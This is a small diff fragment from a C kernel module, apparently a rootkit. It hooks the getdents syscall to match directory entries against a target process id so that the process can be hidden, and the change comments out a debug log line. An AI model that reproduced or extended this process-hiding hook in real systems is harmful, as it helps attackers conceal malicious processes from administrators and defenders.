@@ -75,7 +75,7 @@ asmlinkage int our_sys_getdents(unsigned int fd,
 	{
 		len = dirp->d_reclen;
 		tlen = tlen - len;
-		printk(KERN_INFO "d_name = %s\n",dirp->d_name);
+		/* printk(KERN_INFO "d_name = %s\n",dirp->d_name); */
 							   
 		if (strcmp(dirp->d_name, target_proc_id) == 0)
 		{
